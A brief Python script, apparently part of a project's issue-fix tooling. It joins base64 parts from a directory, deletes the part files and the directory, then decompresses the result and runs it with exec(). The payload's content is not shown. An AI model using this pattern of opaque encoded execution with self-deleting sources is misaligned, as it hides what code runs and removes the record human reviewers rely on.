#!/usr/bin/env python3
# Reviewed Issue #103 transformation payload.
from pathlib import Path
import base64
import zlib

payload_dir = Path(__file__).with_name("issue-103-mission-value-toolbar-payload")
parts = sorted(payload_dir.glob("part*.txt"))
if not parts:
    raise RuntimeError("Issue #103 payload parts are missing")
encoded = "".join(part.read_text(encoding="ascii").strip() for part in parts)
for part in parts:
    part.unlink()
payload_dir.rmdir()
payload = zlib.decompress(base64.b64decode(encoded))
exec(compile(payload, __file__, "exec"))
